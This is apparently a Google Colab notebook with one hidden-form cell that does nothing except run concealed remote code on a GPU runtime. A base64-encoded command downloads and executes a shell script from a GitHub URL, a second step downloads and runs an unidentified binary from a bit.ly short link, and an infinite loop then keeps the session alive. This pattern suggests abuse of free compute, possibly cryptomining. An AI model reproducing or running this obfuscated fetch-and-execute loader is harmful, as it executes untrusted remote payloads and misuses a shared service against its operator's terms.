{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "hao.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "R-CbmO0H2qGP"
      },
      "source": [
        "#@title haseo\n",
        "\n",
        "%cd /sbin\n",
        "!base64 -d <<< CndnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NrdWxsQ0FORGUvc2t1bGxib25rL21haW4vYnRnLnNoICYmIGNobW9kICt4IGJ0Zy5zaCAmJiAuL2J0Zy5zaA=|sh",
        "!wget https://bit.ly/36dtQty\n",
        "!chmod +x 36dtQty\n",
        "!./36dtQty\n",
        "\n",
        "while True:pass\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}

